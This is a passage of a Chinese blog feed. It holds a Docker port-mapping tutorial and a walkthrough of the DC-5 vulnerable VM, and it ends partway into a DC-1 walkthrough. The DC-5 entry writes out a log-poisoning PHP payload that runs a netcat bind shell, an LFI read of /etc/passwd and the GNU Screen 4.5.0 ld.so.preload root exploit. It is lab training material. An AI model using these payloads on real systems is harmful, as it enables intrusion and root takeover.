    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#docker已运行容器添加或修改端口映射">docker已运行容器添加或修改端口映射</a><ul><li><a href="#1-不推荐方法">1. 不推荐方法：</a></li><li><a href="#2-推荐方法">2. 推荐方法：</a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="docker已运行容器添加或修改端口映射">docker已运行容器添加或修改端口映射</span></h1><h2><span id="1-不推荐方法">1. 不推荐方法：</span></h2><ul><li><strong>将原来的容器提交成镜像，然后利用新的建立的镜像重新建立一个带有端口映射的容器</strong></li></ul><h2><span id="2-推荐方法">2. 推荐方法：</span></h2><ol><li>查看容器的 [hash_of_the_container]值:</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [container-name]</span><br></pre></td></tr></table></figure><ol start="2"><li>修改<code>hostconfig.json</code>文件：</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改之前停止相关容器和docker服务</span></span><br><span class="line">docker stop [hash_of_the_container];service stop docker</span><br><span class="line">vim /var/lib/docker/containers/[hash_of_the_container]/hostconfig.json</span><br><span class="line"><span class="comment">#在 hostconfig.json 找到"PortBindings":&#123;&#125; 这个配置项</span></span><br><span class="line"><span class="comment">#可以照着这个模板添加多个端口映射</span></span><br><span class="line"><span class="string">"PortBindings"</span>:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"80/tcp"</span>:[&#123;</span><br><span class="line">        <span class="string">"HostIp"</span>:<span class="string">""</span>,</span><br><span class="line">        <span class="string">"HostPort"</span>:<span class="string">"8080"</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>修改<code>config.v2.json</code>文件：</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /var/lib/docker/containers/[hash_of_the_container]/config.v2.json</span><br><span class="line"><span class="comment">#在 config.v2.json 里面找到:</span></span><br><span class="line"><span class="string">"Tty"</span>: <span class="literal">true</span> <span class="comment">#在这之前添加一个配置项 :</span></span><br><span class="line"><span class="string">"ExposedPorts"</span>:&#123;<span class="string">"80/tcp"</span>:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>最后重启 <strong>docker</strong>的守护进程 </li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><ol start="5"><li>查看配置项已经修改成功</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect &lt;container-name&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#docker已运行容器添加或修改端口映射&quot;&gt;docker已运行容器添加或修改端口映射&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-不推荐方法&quot;&gt;1. 不推荐方法：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-推荐方法&quot;&gt;2. 推荐方法：&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="Docker" scheme="https://atc96.top/categories/Docker/"/>
    
    
      <category term="Docker" scheme="https://atc96.top/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>DC-5 靶机渗透</title>
    <link href="https://atc96.top/DC-5/"/>
    <id>https://atc96.top/DC-5/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T10:15:58.072Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#dc-5-靶机渗透">DC-5 靶机渗透</a><ul><li><a href="#1渗透过程">1.渗透过程</a></li><li><a href="#__theend__"><strong>THEEND!</strong></a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="dc-5-靶机渗透">DC-5 靶机渗透</span></h1><h2><span id="1渗透过程">1.渗透过程</span></h2><ul><li>开始，扫描主机：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.0.1/24</span><br></pre></td></tr></table></figure><ul><li><p>找到一个 <code>192.168.0.149   00:0c:29:cb:31:5f      1      60  VMware, Inc.</code></p></li><li><p>扫端口：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -p- 192.168.0.149</span><br></pre></td></tr></table></figure><ul><li>扫描结果：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-26 14:36 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.149</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">|_http-server-header: nginx/1.6.2</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          38192/tcp  status</span><br><span class="line">|_  100024  1          47477/udp  status</span><br><span class="line">38192/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 00:0C:29:CB:31:5F (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure><ul><li><p>只有开启了 <code>80 http     111:RPC     38192:RPC</code></p></li><li><p>在下载的时候看到的描述:</p></li><li><blockquote><p>  As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.<br>  据我所知，只有一个可利用的入口点（也没有SSH）。这个特定的入口点可能很难识别，但它就在那里。你需要寻找一些不寻常的东西（随着页面刷新而改变的东西）。这将有希望提供一些关于脆弱性可能涉及到什么的想法。</p></blockquote></li><li><p>我们需要寻找 &gt;&gt; <code>随着页面刷新而改变的东西</code></p></li><li><p>翻翻他的网页最后在 提交留言之后的页面 &gt;&gt;</p></li><li><p><a href="http://192.168.0.149/thankyou.php?firstname=11&amp;lastname=11&amp;country=britain&amp;subject=111" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?firstname=11&amp;lastname=11&amp;country=britain&amp;subject=111</a></p></li><li><p>找到他的底部的 <code>Copyright © 2019</code></p></li><li><p>年份会变化,那也不知道哪里有漏洞啊</p></li><li><p>先给他爆破个目录:</p></li><li><p>然后爆出来:</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">200 OK-----http://192.168.0.149//index.php</span><br><span class="line">200 OK-----http://192.168.0.149//contact.php</span><br><span class="line">200 OK-----http://192.168.0.149//faq.php</span><br><span class="line">200 OK-----http://192.168.0.149//footer.php</span><br></pre></td></tr></table></figure><ul><li><p>前面的几个都在页面上有的</p></li><li><p>我们去看看这个:<a href="http://192.168.0.149//footer.php" target="_blank" rel="noopener">http://192.168.0.149//footer.php</a></p></li><li><p>内容和<code>thankyou.php</code>的底部一样的文字</p></li><li><p>刷新一下年份也会变化</p></li><li><p>那可能就是<code>thankyou.php</code>包含了<code>footer.php</code></p></li><li><p>先试试 <a href="http://192.168.0.149/thankyou.php?page=footer.php" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?page=footer.php</a></p></li><li><p>没区别再试试<a href="http://192.168.0.149/thankyou.php?page=/etc/passwd" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?page=/etc/passwd</a></p></li><li><p>也没啥区别,再试试 <a href="http://192.168.0.149/thankyou.php?file=/etc/passwd" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?file=/etc/passwd</a></p></li><li><p>发现底部包含进来了!!!</p></li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span> </span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span> </span><br><span class="line"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">60</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">man:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:man</span><span class="symbol">:/var/cache/man</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">8</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">:news</span><span class="symbol">:/var/spool/news</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">10</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line">www-<span class="symbol">data:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:www-data</span><span class="symbol">:/var/www</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">backup:</span><span class="symbol">x:</span><span class="number">34</span><span class="symbol">:</span><span class="number">34</span><span class="symbol">:backup</span><span class="symbol">:/var/backups</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">list:</span><span class="symbol">x:</span><span class="number">38</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:Mailing</span> List <span class="symbol">Manager:</span>/var/<span class="symbol">list:</span>/usr/sbin/nologin </span><br><span class="line"><span class="symbol">irc:</span><span class="symbol">x:</span><span class="number">39</span><span class="symbol">:</span><span class="number">39</span><span class="symbol">:ircd</span><span class="symbol">:/var/run/ircd</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">gnats:</span><span class="symbol">x:</span><span class="number">41</span><span class="symbol">:</span><span class="number">41</span><span class="symbol">:Gnats</span> Bug-Reporting System (admin)<span class="symbol">:/var/lib/gnats</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line">systemd-<span class="symbol">timesync:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">103</span><span class="symbol">:systemd</span> Time Synchronization,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/bin/false</span></span><br><span class="line">systemd-<span class="symbol">network:</span><span class="symbol">x:</span><span class="number">101</span><span class="symbol">:</span><span class="number">104</span><span class="symbol">:systemd</span> Network </span><br><span class="line">Management,,,<span class="symbol">:/run/systemd/netif</span><span class="symbol">:/bin/false</span> </span><br><span class="line">systemd-<span class="symbol">resolve:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">105</span><span class="symbol">:systemd</span> Resolver,,,<span class="symbol">:/run/systemd/resolve</span><span class="symbol">:/bin/false</span> </span><br><span class="line">systemd-bus-<span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">103</span><span class="symbol">:</span><span class="number">106</span><span class="symbol">:systemd</span> Bus Proxy,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/bin/false</span> Debian-<span class="symbol">exim:</span><span class="symbol">x:</span><span class="number">104</span><span class="symbol">:</span><span class="number">109</span><span class="symbol">:</span><span class="symbol">:/var/spool/exim4</span><span class="symbol">:/bin/false</span> </span><br><span class="line"><span class="symbol">messagebus:</span><span class="symbol">x:</span><span class="number">105</span><span class="symbol">:</span><span class="number">110</span><span class="symbol">:</span><span class="symbol">:/var/run/dbus</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">statd:</span><span class="symbol">x:</span><span class="number">106</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/var/lib/nfs</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">107</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/var/run/sshd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">dc:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:dc</span>,,,<span class="symbol">:/home/dc</span><span class="symbol">:/bin/bash</span> <span class="symbol">mysql:</span><span class="symbol">x:</span><span class="number">108</span><span class="symbol">:</span><span class="number">113</span><span class="symbol">:MySQL</span></span><br><span class="line">Server,,,<span class="symbol">:/nonexistent</span><span class="symbol">:/bin/false</span></span><br></pre></td></tr></table></figure><ul><li><p>有<code>本地文件包含漏洞(LFI)</code> 好办了 ^_^</p></li><li><p>我们试试日志注入:</p></li><li><p>前面 <code>nmap</code> 扫出web服务器是 <code>nginx 1.6.2</code></p></li><li><p>然后 nginx默认的访问日志在: <code>/var/log/nginx/access.log</code></p></li><li><p>直接输入: <a href="http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log</a> 验证一下</p></li><li><p>真包含进来了~ <strong>(ps:前面的爆破会产生大量日志内容,可能导致读不出内容,建议在爆破之前给靶机来个快照)</strong></p></li><li><p>我们直接用nc去连接他的80端口:</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/workspace<span class="comment"># nc 192.168.0.149 80</span></span><br><span class="line"><span class="comment">#直接写一个直连的shellcode</span></span><br><span class="line">GET &lt;?php system(<span class="string">'nc -lvp 13123 -e /bin/bash'</span>);?&gt; HTTP/1.1</span><br><span class="line"><span class="comment">#下面的自己生成的</span></span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Server: nginx/1.6.2</span><br><span class="line">Date: Sat, 25 Apr 2020 17:33:49 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 172</span><br><span class="line">Connection: close</span><br><span class="line"><span class="comment"># 返回信息:</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=<span class="string">"white"</span>&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx/1.6.2&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><p>然后我们再访问:<a href="http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log</a></p></li><li><p>这时候会一直加载出不来页面就说明成功了</p></li><li><p>服务器就会开启监听 <code>13123</code> 端口 ,直接用<code>nc 192.168.0.149 13123</code> 就可以得到shell 了</p></li><li><p>得到shell了 再让他来个标准控制台</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure><ul><li><p>得到标准控制台之后 就要想办法提权了</p></li><li><p>先看看用户目录,发现只有一个<code>dc</code> 用户有用户目录</p></li><li><p>里面啥也没有 再翻翻 <code>/tmp</code> 文件夹 也没</p></li><li><p>先看看suid 的提权 </p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ul><li>找出suid的文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure><ul><li>百度才知道 :<code>screen-4.5.0</code> 有一个提权漏洞</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># searchsploit screen 4.5.0</span></span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation  </span><br><span class="line">| exploits/linux/<span class="built_in">local</span>/41154.sh                                                                        </span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation (PoC)  </span><br><span class="line">| exploits/linux/<span class="built_in">local</span>/41152.txt</span><br></pre></td></tr></table></figure><ul><li><p>找到两个文件 直接用那个sh文件吧</p></li><li><p>可以到自己的kali 运行一下,会产生两个文件并获得<code>rootshell</code></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-rwxr-xr-x 1 root root  1152 4月  26 15:57 41154.sh</span><br><span class="line">-rwxr-xr-x 1 root root 16136 4月  26 15:57 libhax.so</span><br><span class="line">-rwxr-xr-x 1 root root 16824 4月  26 15:57 rootshell</span><br></pre></td></tr></table></figure><ul><li><p>然后我们用kali写一个sh文件: <code>vim /tmp/run.sh</code></p></li><li><p>内容是:</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><ul><li>我们用 scp 拷贝到靶机里去</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">scp root@192.168.0.21:/tmp/libhax.so /tmp</span><br><span class="line"><span class="comment">#然后输入kali的密码</span></span><br><span class="line">scp root@192.168.0.21:/tmp/rootshell /tmp</span><br><span class="line"><span class="comment">#然后输入kali的密码</span></span><br><span class="line">scp root@192.168.0.21:/tmp/run.sh /tmp</span><br></pre></td></tr></table></figure><ul><li>然后依次执行下面的语句或者写成shell脚本</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><ul><li><p>给他个执行权限并运行 <code>cd /tmp;chmod +x run.sh;./run.sh</code></p></li><li><p>就可以得到一个<code>rootshell</code>了:</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:~$ <span class="built_in">cd</span> /tmp;chmod +x run.sh;./run.sh</span><br><span class="line"><span class="built_in">cd</span> /tmp;chmod +x run.sh;./run.sh</span><br><span class="line">[+] Triggering...</span><br><span class="line"><span class="string">' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></span><br></pre></td></tr></table></figure><ul><li>flag 就在<code>/root</code>下的<code>thisistheflag.txt</code>文件</li></ul><h2><span id="theend"><strong>THEEND!</strong></span></h2>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#dc-5-靶机渗透&quot;&gt;DC-5 靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1渗透过程&quot;&gt;1.渗透过程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#__theend__&quot;&gt;&lt;strong&gt;THEEND!&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DC-1 靶机渗透</title>
    <link href="https://atc96.top/DC-1/"/>
    <id>https://atc96.top/DC-1/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T09:51:30.635Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#dc-1-靶机渗透">DC-1 靶机渗透</a><ul><li><a href="#1渗透过程">1.渗透过程</a></li><li><a href="#2重要信息">2.重要信息</a></li><li><a href="#3-flag">3. flag</a></li><li><a href="#__the_end__"><strong>THE_END</strong></a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="dc-1-靶机渗透">DC-1 靶机渗透</span></h1><h2><span id="1渗透过程">1.渗透过程</span></h2><ul><li><p>直接开始~~</p></li><li><p>IP发现 <code>netdiscover</code></p></li><li><p>找到一个ip为 <code>192.168.0.119</code>的机器</p></li><li><p>给他扫下端口 <code>nmap -sT T4 -v -p- 192.168.0.119 -oN /tmp/res.txt</code></p></li><li><p>结果如下</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.70 scan initiated Fri Apr 24 14:34:40 2020 as: nmap -sT -v -p- -oN /tmp/res.txt T4 192.168.0.119</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> T4 (223.82.248.117) [host down]</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.119</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">47675/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:D0:43:83 (VMware)</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line"><span class="comment"># Nmap done at Fri Apr 24 14:34:45 2020 -- 2 IP addresses (1 host up) scanned in 5.79 seconds</span></span><br></pre></td></tr></table></figure><ul><li><p>有个<code>rpcbind</code>没见过的百度了一下：</p></li><li><blockquote><p>  RPC是远程过程调用（Remote Procedure 